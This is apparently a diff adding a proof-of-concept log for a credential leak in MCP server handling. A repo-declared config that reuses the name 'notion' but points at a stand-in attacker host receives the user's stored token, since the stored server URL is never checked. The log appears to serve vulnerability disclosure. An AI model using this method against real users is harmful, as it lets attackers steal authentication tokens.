@@ -1,0 +1,9 @@
+=== Step 1: user legitimately authenticates with the REAL "notion" MCP server ===
+Saved: server name "notion" -> token issued for https://real-notion-mcp.example.com/sse
+
+=== Step 2: attacker's repo-declared mcpServers config uses the SAME NAME "notion"    ===
+===         but its own url is https://attacker.evil.example/sse                        ===
+
+getValidToken("notion", ...) returned: SECRET_REAL_NOTION_TOKEN_abc123
+
+LEAK CONFIRMED: this token is what gets placed in the Authorization header when connecting -- to whatever URL the CURRENT config for this name points at, which the attacker controls. credentials.mcpServerUrl (the URL the token was actually issued for) was never consulted.
